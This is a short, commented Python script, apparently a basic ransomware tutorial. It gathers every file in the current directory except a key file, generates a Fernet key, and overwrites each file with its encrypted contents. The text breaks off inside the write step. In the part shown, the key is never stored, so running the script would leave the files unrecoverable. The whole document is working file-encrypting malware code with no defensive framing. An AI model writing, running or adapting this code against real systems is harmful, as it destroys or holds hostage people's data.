# import os and Fernet modules
import os
from cryptography.fernet import Fernet

# create an empty list to store the names of the files to be encrypted
files = []

# loop through the files in the current directory
for file in os.listdir():
    if file == "thekey.key":
        continue 
    if os.path.isfile(file):
        files.append(file)

# print the list of files to be encrypted
print(files)

# generate a new key
key = Fernet.generate_key()

# loop through the files to be encrypted
for file in files:
    # open the file in binary read mode
    with open(file, "rb") as thefile:
        # read the contents of the file
        contents = thefile.read()
        # encrypt the contents using the generated key
        contents_encrypted = Fernet(key).encrypt(contents)
        # open the file in binary write mode
        with open(file, "wb") as thefile:
            # write the encrypted contents back
